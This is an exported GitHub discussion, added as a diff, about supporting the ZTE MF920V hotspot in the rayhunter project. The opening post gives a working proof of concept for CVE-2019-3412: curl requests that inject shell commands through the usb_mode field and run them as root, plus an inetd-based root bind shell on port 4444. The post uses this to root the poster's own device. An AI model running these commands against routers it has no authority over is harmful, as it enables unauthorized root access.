@@ -1,0 +1,430 @@
+{
+  "id": "D_kwDOKrJqmc4Aj8tb",
+  "number": 846,
+  "title": "ZTE MF920V",
+  "body": "The ZTE MF920V (also sold as Vodafone R218) is viable to install rayhunter on. I obtained a device secondhand with firmware `BD_ENATMF920VV1.0.0B04`\r\n\r\nroot can be obtained using [CVE-2019-3412](https://www.pentestpartners.com/security-blog/zte-mf910-an-end-of-life-router-running-lots-of-vivacious-hidden-code/). here is a POC:\r\n\r\n```bash\r\n# Login (save cookies to /tmp/zte-cookies)\r\ncurl -s -c /tmp/zte-cookies -H \"Referer: http://192.168.0.1/index.html\" \\\r\n  -X POST http://192.168.0.1/goform/goform_set_cmd_process \\\r\n  -d \"isTest=false&goformId=LOGIN&password=$(echo -n 'YOURPASSWORD' | base64)\"\r\n# Returns: {\"result\":\"0\"} on success\r\n```\r\n\r\n```bash\r\n# Inject a command (reuse cookies from login)\r\ncurl -s -b /tmp/zte-cookies -H \"Referer: http://192.168.0.1/index.html\" \\\r\n  -X POST http://192.168.0.1/goform/goform_set_cmd_process \\\r\n  -d 'isTest=false&goformId=USB_MODE_SWITCH&usb_mode=6%3bid%3b'\r\n# The command after the semicolon (here: `id`) runs as root.\r\n```\r\n\r\n## limited tools\r\n\r\nGetting a proper root shell is hard because busybox has neither nc nor telnetd:\r\n\r\n```\r\n# 1. Write inetd config\r\ncurl -s -b /tmp/zte-cookies -H \"Referer: http://192.168.0.1/index.html\" \\\r\n  -X POST http://192.168.0.1/goform/goform_set_cmd_process \\\r\n  -d 'isTest=false&goformId=USB_MODE_SWITCH&usb_mode=6%3becho%20%224444%20stream%20tcp%20nowait%20root%20/bin/sh%20sh%20-i%22%20>%20/tmp/inetd.conf%3bbusybox%20inetd%20/tmp/inetd.conf%3b'\r\n\r\n# 2. Connect\r\necho \"id\" | nc -w 3 192.168.0.1 4444\r\n# uid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\nso this would mean we have to write a custom file transfer for this device too.\r\n\r\n## storage is low and read-only\r\n\r\n| Mount point | Device | Type | Mode | Free | Notes |\r\n|---|---|---|---|---|---|\r\n| `/` | ubi0:rootfs | ubifs | **ro** | 15.3 MB | Remountable rw. Contains `/data/`, `/etc/` |\r\n| `/cache` | ubi0:cachefs | ubifs | rw | **24.3 MB** | appears to survive a reboot, not sure when this is wiped. |\r\n| `/etc_rw` | ubi0:etcrwfs | ubifs | rw | 2.5 MB |  |\r\n| `/logfs` | ubi0:logfs | ubifs | rw | 6.3 MB |  |\r\n| `/usr/wlan_backups` | /dev/ubi2_0 | ubifs | rw | 6.1 MB |  |\r\n| `/usr/zte_web` | ubi0:ztedata | ubifs | **ro** | 10.7 MB |  |\r\n| `/firmware` | /dev/ubi1_0 | ubifs | **ro** | 11.6 MB |  |\r\n| `/media/card` | /dev/mmcblk0p1 | auto | noauto | - | there doesn't seem to be an actual sdcard slot |\r\n| `/tmp` | (symlink to /var/tmp) | tmpfs | rw | ~25 MB |  |\r\n\r\nwe can remount it using `mount -o remount,rw /` though.\r\n\r\n## misc\r\n\r\n* rc.d appears to be present, so autostart should work fine.\r\n* /dev/diag exists but didn't test if it returns useful data.\r\n* web interface seems to have similarities with Orbic (\"goform\") and similar configurability as tplink (port triggers, forwardings)",
+  "author": {
+    "login": "untitaker",
+    "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+    "url": "https://github.com/untitaker"
+  },
+  "created_at": "2026-02-03T15:28:41Z",
+  "updated_at": "2026-03-27T08:03:14Z",
+  "closed": false,
+  "locked": false,
+  "url": "https://github.com/EFForg/rayhunter/discussions/846",
+  "category": {
+    "id": "DIC_kwDOKrJqmc4Cofi5",
+    "name": "Ideas",
+    "description": "Share ideas for new features",
+    "emoji": ":bulb:",
+    "is_answerable": false
+  },
+  "labels": [
+    {
+      "id": "LA_kwDOKrJqmc8AAAAB8J8Feg",
+      "name": "new-hardware",
+      "color": "c5def5",
+      "description": "Adding support for new hardware"
+    }
+  ],
+  "comments": [
+    {
+      "id": "DC_kwDOKrJqmc4A71bc",
+      "body": "## running the daemon\r\n\r\n* /dev/diag seems to kind of work if one changes the device mode to tplink. with the orbic device mode, the diag ioctl does not work.\r\n* battery status is broken\r\n* status indicator/leds need support",
+      "author": {
+        "login": "untitaker",
+        "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+        "url": "https://github.com/untitaker"
+      },
+      "created_at": "2026-02-03T15:52:44Z",
+      "updated_at": "2026-02-03T15:54:54Z",
+      "is_answer": false,
+      "replies": [],
+      "minimized_reason": null,
+      "is_minimized": false,
+      "reactions": [
+        {
+          "content": "THUMBS_UP",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "THUMBS_DOWN",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "LAUGH",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HOORAY",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "CONFUSED",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HEART",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "ROCKET",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "EYES",
+          "total_count": 0,
+          "users": []
+        }
+      ],
+      "upvote_count": 1
+    },
+    {
+      "id": "DC_kwDOKrJqmc4A8Bws",
+      "body": "implemented in https://github.com/EFForg/rayhunter/pull/872",
+      "author": {
+        "login": "untitaker",
+        "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+        "url": "https://github.com/untitaker"
+      },
+      "created_at": "2026-02-08T18:16:45Z",
+      "updated_at": "2026-02-08T18:16:45Z",
+      "is_answer": false,
+      "replies": [],
+      "minimized_reason": null,
+      "is_minimized": false,
+      "reactions": [
+        {
+          "content": "THUMBS_UP",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "THUMBS_DOWN",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "LAUGH",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HOORAY",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "CONFUSED",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HEART",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "ROCKET",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "EYES",
+          "total_count": 0,
+          "users": []
+        }
+      ],
+      "upvote_count": 1
+    },
+    {
+      "id": "DC_kwDOKrJqmc4A88-V",
+      "body": "Hey @untitaker , i've read in your pull request #872 that the mf920u doesnt work with it. Few months ago i was able to get uart access on my mf920u and was able to dump the firmware and get a shell running. Maybe this might help you: https://github.com/Wapitiii/zte-mf920u",
+      "author": {
+        "login": "Wapitiii",
+        "avatar_url": "https://avatars.githubusercontent.com/u/39195287?u=33d890080f6eeeb263cf2588f52f5e034156716b&v=4",
+        "url": "https://github.com/Wapitiii"
+      },
+      "created_at": "2026-03-03T00:04:18Z",
+      "updated_at": "2026-03-03T00:04:18Z",
+      "is_answer": false,
+      "replies": [
+        {
+          "id": "DC_kwDOKrJqmc4A8-Dm",
+          "body": "thanks, I have found a way to get ADB access too, I just haven't found the time to implement it. I'll add your repo to the docs when the time comes",
+          "author": {
+            "login": "untitaker",
+            "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+            "url": "https://github.com/untitaker"
+          },
+          "created_at": "2026-03-03T09:51:05Z",
+          "updated_at": "2026-03-03T09:51:05Z",
+          "is_answer": false,
+          "replies": [],
+          "minimized_reason": null,
+          "is_minimized": false,
+          "reactions": [
+            {
+              "content": "THUMBS_UP",
+              "total_count": 1,
+              "users": [
+                "Wapitiii"
+              ]
+            },
+            {
+              "content": "THUMBS_DOWN",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "LAUGH",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HOORAY",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "CONFUSED",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HEART",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "ROCKET",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "EYES",
+              "total_count": 0,
+              "users": []
+            }
+          ],
+          "upvote_count": 1
+        },
+        {
+          "id": "DC_kwDOKrJqmc4A96jY",
+          "body": "@Wapitiii I updated https://github.com/EFForg/rayhunter/pull/872 to reflect my current approach of getting a shell on MF920V. can you tell me how you got a shell on the MF920U? I am not able to do that without takign the device apart.",
+          "author": {
+            "login": "untitaker",
+            "avatar_url": "https://avatars.githubusercontent.com/u/837573?u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4",
+            "url": "https://github.com/untitaker"
+          },
+          "created_at": "2026-03-20T18:27:39Z",
+          "updated_at": "2026-03-20T18:28:35Z",
+          "is_answer": false,
+          "replies": [],
+          "minimized_reason": null,
+          "is_minimized": false,
+          "reactions": [
+            {
+              "content": "THUMBS_UP",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "THUMBS_DOWN",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "LAUGH",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HOORAY",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "CONFUSED",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HEART",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "ROCKET",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "EYES",
+              "total_count": 0,
+              "users": []
+            }
+          ],
+          "upvote_count": 0
+        },
+        {
+          "id": "DC_kwDOKrJqmc4A-VUb",
+          "body": "@untitaker I only was able to get shell on my MF920U via UART. It might be possible to find a vulnerability, or flash modified firmware (i think the zte loader has some \"secure boot\" implementation preventing modification of u-boot vars and other things) to enable ADB access or SSH. The ZTE Downloader tool in my repository can successfully dump the whole firmware, even without UART access, which makes analysis easier. Not sure tho if it works with the MF920V might need mtd dump to correctly dump firmware. Maybe when i have the time, i'll try to see if i can get access without the whole disassembly part.",
+          "author": {
+            "login": "Wapitiii",
+            "avatar_url": "https://avatars.githubusercontent.com/u/39195287?u=33d890080f6eeeb263cf2588f52f5e034156716b&v=4",
+            "url": "https://github.com/Wapitiii"
+          },
+          "created_at": "2026-03-27T08:03:14Z",
+          "updated_at": "2026-03-27T08:04:07Z",
+          "is_answer": false,
+          "replies": [],
+          "minimized_reason": null,
+          "is_minimized": false,
+          "reactions": [
+            {
+              "content": "THUMBS_UP",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "THUMBS_DOWN",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "LAUGH",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HOORAY",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "CONFUSED",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "HEART",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "ROCKET",
+              "total_count": 0,
+              "users": []
+            },
+            {
+              "content": "EYES",
+              "total_count": 0,
+              "users": []
+            }
+          ],
+          "upvote_count": 0
+        }
+      ],
+      "minimized_reason": null,
+      "is_minimized": false,
+      "reactions": [
+        {
+          "content": "THUMBS_UP",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "THUMBS_DOWN",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "LAUGH",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HOORAY",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "CONFUSED",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "HEART",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "ROCKET",
+          "total_count": 0,
+          "users": []
+        },
+        {
+          "content": "EYES",
+          "total_count": 0,
+          "users": []
+        }
+      ],
+      "upvote_count": 1
+    }
+  ],
+  "answer": null,
+  "answer_chosen_at": null,
+  "state_reason": null,
+  "reactions": [
+    {
+      "content": "THUMBS_UP",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "THUMBS_DOWN",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "LAUGH",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "HOORAY",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "CONFUSED",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "HEART",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "ROCKET",
+      "total_count": 0,
+      "users": []
+    },
+    {
+      "content": "EYES",
+      "total_count": 0,
+      "users": []
+    }
+  ],
+  "upvote_count": 2
+}
